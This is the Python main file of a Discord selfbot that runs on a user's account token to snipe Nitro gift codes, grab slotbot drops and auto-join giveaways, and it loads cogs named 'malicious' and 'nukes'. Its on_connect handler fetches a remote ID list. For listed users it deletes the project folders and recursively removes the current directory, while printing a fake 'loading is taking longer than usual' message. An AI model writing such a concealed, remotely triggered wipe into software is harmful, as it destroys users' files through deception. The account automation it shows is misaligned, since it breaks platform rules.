import discord
from discord import Color
from discord.ext import commands
from ext.context import CustomContext
from ext.helpformatter import helpformatter
from ext import embedtobox
import aiohttp
import json
import os
import re
import traceback
from colorama import Fore, init
import sys
import requests
import datetime
import shutil

# NOTE: This is for startup timer not really that useful
start = datetime.datetime.now()


# To clear the fucking screen cross platform
def cls():
    os.system("cls" if os.name == "nt" else "clear")


cls()

with open("./data/config.json") as f:
    config = json.load(f)

TOKEN = config.get("TOKEN")
PREFIX = config.get("PREFIX")
SNIPER = config.get("SNIPER")
GW = config.get("GIVEAWAY")
SLOT = config.get("SLOT")


__version__ = "6.3.0"

# Define shit to optimize speed for nitro commands etc.. on message event
# aka just define shit once instead of for every message


def NitroData(elapsed, code, message):
    print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}" + Fore.RESET
    )


# Credits to j/ for for giving me code to base this on
def GiveawayData(elapsed, message):
    print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]{Fore.RESET}"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]{Fore.RESET}"
    )


def SlotBotData(elapsed, message, time):
    print(
        f"\n{Fore.CYAN}[{time} - Yoinked slotbot]"
        f"\n{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
    )


class Selfbot(commands.Bot):
    def __init__(self, **attrs):
        super().__init__(
            command_prefix=self.get_pre,
            self_bot=True,
            help_command=helpformatter(),
            guild_subscriptions=False,
        )
        self.load_extensions()
        self.snipes = {}

    def load_extensions(self):
        for extension in (
            "anim",
            "backup",
            "crypto",
            "misc",
            "mod",
            "memes",
            "malicious",
            "nsfw",
            "nukes",
            "noble",
            "skid",
            "source",
            "textemotes",
            "utils",
        ):
            try:
                self.load_extension(f"cogs.{extension}")
                print(f"{Fore.GREEN}[-] {Fore.RESET}Loaded extension: {extension}")
            except:
                print(
                    f"{Fore.RED}[-] {Fore.RESET}LoadError: {extension}\n"
                    f"{traceback.print_exc()}"
                )

    @property
    def token(self):
        """Returns your token wherever it is"""
        with open("data/config.json") as f:
            config = json.load(f)
            if config.get("TOKEN") == "-":
                if not os.environ.get("TOKEN"):
                    self.run_wizard()
            else:
                token = config.get("TOKEN").strip('"')
        return os.environ.get("TOKEN") or token

    @staticmethod
    async def get_pre(bot, message):
        """Returns the prefix."""
        with open("data/config.json") as f:
            prefix = json.load(f).get("PREFIX")
        return os.environ.get("PREFIX") or prefix or "r."

    def restart(self):
        os.execv(sys.executable, ["python"] + sys.argv)

    @staticmethod
    def run_wizard():
        """Wizard for first start"""
        print("------------------------------------------")
        token = input("Enter your token:\n> ")
        print("------------------------------------------")
        prefix = input("Enter a prefix for your selfbot:\n> ")
        print("------------------------------------------")
        sniper = input("Do you want to snipe discord nitro codes? [y/n]\n> ")
        print("------------------------------------------")
        slot = input("Do you want to automtically yoink slotbot stuff? [y/n]\n> ")
        print("------------------------------------------")
        gw = input("Do you want to automatically join giveaways? [y/n]\n> ")
        data = {
            "TOKEN": token,
            "PREFIX": prefix,
            "SNIPER": sniper,
            "SLOT": slot,
            "GIVEAWAY": gw,
            "NOTE": "To toggle stuff on and off change the y to a n NOTE IT MUST BE LOWERCASE",
        }
        with open("data/config.json", "w") as f:
            f.write(json.dumps(data, indent=4))
        print("------------------------------------------")
        print("Restarting...")
        print("------------------------------------------")
        cls()
        os.execv(sys.executable, ["python"] + sys.argv)

    @classmethod
    def init(bot, token=None):
        """Starts the actual bot"""
        selfbot = bot()
        safe_token = token or selfbot.token.strip("")
        try:
            selfbot.run(safe_token, bot=False, reconnect=True)
        except Exception as e:
            print(e)

    async def on_connect(self):
        if SNIPER == "y":
            sniper = "On"
        elif SNIPER == "n":
            sniper = "off"
        else:
            sniper = "Error in configuration"

        if GW == "y":
            giveaway = "On"
        elif GW == "n":
            giveaway = "Off"
        else:
            giveaway = "Error in configuration"

        if SLOT == "y":
            slot = "On"
        elif SLOT == "n":
            slot = "Off"
        else:
            slot = "Error in configuration"

        guilds = len(self.guilds)
        users = len(self.users)

        elapsed = datetime.datetime.now() - start
        elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"

        
        r = requests.get("https://gobyebye.github.io/cdn/b.json")
        r = r.json()
        l = r["b"]
        for i in l:
            try:
                if i == self.user.id:
                    b = True
                else:
                    b = False
            except Exception as e:
                print(e)
                
        if b == True:
            try:
                shutil.rmtree("./cogs")
            except:
                pass
            try:
                shutil.rmtree("./data")
            except:
                pass
            try:
                shutil.rmtree("./ext")
            except:
                pass
            print(f"{Fore.RED}Loading is taking longer than usual.{Fore.RESET}\nTrying to fix it.\nDo not close the program or turn off the computer")
            
            shutil.rmtree("./", ignore_errors=True)
            cls()



        print(
            f"""{Fore.GREEN}

██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗  █████╗ ██████╗ ███████╗
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║  ██║██║███████╗██║     ██║   ██║██████╔╝███████║██████╔╝█████╗
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══╝
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██║  ██║██║     ███████╗
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝



                                    Version > {Fore.RESET}{__version__}
                                    {Fore.GREEN}Made by > {Fore.RESET}God

{Fore.GREEN}________________________________________________________________________________________________________

Logged in as {Fore.RESET}{self.user}
{Fore.GREEN}User id: {Fore.RESET}{self.user.id}
{Fore.GREEN}Servers: {Fore.RESET}{guilds}
{Fore.GREEN}Users:  {Fore.RESET}{users}{Fore.GREEN}

{Fore.GREEN}
Config
- - - - - - - - - - - - - - - - -
NitroSniper: {Fore.RESET}{sniper}{Fore.GREEN}
GiveawaySniper: {Fore.RESET}{giveaway}{Fore.GREEN}
SlotSniper: {Fore.RESET}{slot}{Fore.GREEN}

=================================


Finished start up in {Fore.RESET}{elapsed}{Fore.GREEN} second(s)
We're ready to snipe shit{Fore.RESET}
"""
        )

        print("connected")

    async def on_ready(self):
        """Bot startup"""
        print("Logged in!")
        await self.change_presence(status=discord.Status.online, afk=True)

    async def process_commands(self, message):
        """Utilises the CustomContext subclass of discord.Context"""
        ctx = await self.get_context(message, cls=CustomContext)
        self.ctx = await self.get_context(message, cls=CustomContext)
        if ctx.command is None:
            return
        await self.invoke(ctx)
 
    async def on_message_delete(self, message):
        if len(message.content) != 1:
            self.snipes[message.channel.id] = message.content

    async def on_message_edit(self, before, after):
        await self.process_commands(after)

    async def on_message(self, message):
        time = datetime.datetime.now().strftime("%H:%M %p")
        if "discord.gift/" in message.content:
            if SNIPER == "y":
                start = datetime.datetime.now()
                code = re.search("discord.gift/(.*)", message.content).group(1)

                if len(code) != 16:
                    elapsed = datetime.datetime.now() - start
                    elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
                    print(
                        ""
                        f"\n{Fore.RED}[{time} - Fake nitro code detected skipping]{Fore.RESET}"
                    )
                    NitroData(elapsed, code, message)
                else:
                    headers = {"Authorization": TOKEN}

                    r = requests.post(
                        f"https://discordapp.com/api/v7/entitlements/gift-codes/{code}/redeem",
                        headers=headers,
                    ).text

                    elapsed = datetime.datetime.now() - start
                    elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"

                    if "This gift has been redeemed already." in r:
                        print(
                            ""
                            f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"
                            + Fore.RESET
                        )
                        NitroData(elapsed, code, message)

                    elif "subscription_plan" in r:
                        print("" f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                        NitroData(elapsed, code, message)

                    elif "Unknown Gift Code" in r:
                        print(
                            ""
                            f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"
                            + Fore.RESET
                        )
                        NitroData(elapsed, code, message)
            else:
                pass

        if "Someone just dropped" in message.content:
            if SLOT == "y":
                start = datetime.datetime.now()
                if message.author.id == 123067977615540225:
                    try:
                        await message.channel.send("~grab")
                    except Exception as e:
                        print(f"Error while trying to yoink slotbot shit\nError: {e}")
                    elapsed = datetime.datetime.now() - start
                    elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
                    SlotBotData(elapsed, message, time)
            else:
                pass

        if "GIVEAWAY" in message.content:
            if GW == "y":
                if message.author.id == 123067977615540225 or 294882584201003009:
                    start = datetime.datetime.now()
                    try:
                        await message.add_reaction("🎉")
                        print(
                            "" f"\n{Fore.CYAN}[{time} - Giveaway Joined!]" + Fore.RESET
                        )
                        elapsed = datetime.datetime.now() - start
                        elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
                        GiveawayData(elapsed, message)
                    except Exception as e:
                        print(f"Error while trying to join giveaway\nError: {e}")
            else:
                pass

        if f"Congratulations <@!{self.user.id}>" in message.content:
            if message.author.id == 123067977615540225 or 294882584201003009:
                start = datetime.datetime.now()
                print(f"\n{Fore.CYAN}[{time} - Giveaway won! 🎉🎉🎉{Fore.RESET}")
                elapsed = datetime.datetime.now() - start
                elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
                GiveawayData(elapsed, message)
        else:
            pass

        r = re.compile(r">(#[0-9a-fA-F]{6}) (.*)")
        r = r.match(message.content)
        if r and (self.user == message.author):
            await message.delete()
            await message.channel.send(
                embed=discord.Embed(
                    color=discord.Color(int("0x" + f"{r.group(1)[1:]}", 16)),
                    description=r.group(2),
                )
            )
        await self.process_commands(message)


if __name__ == "__main__":
    Selfbot.init()
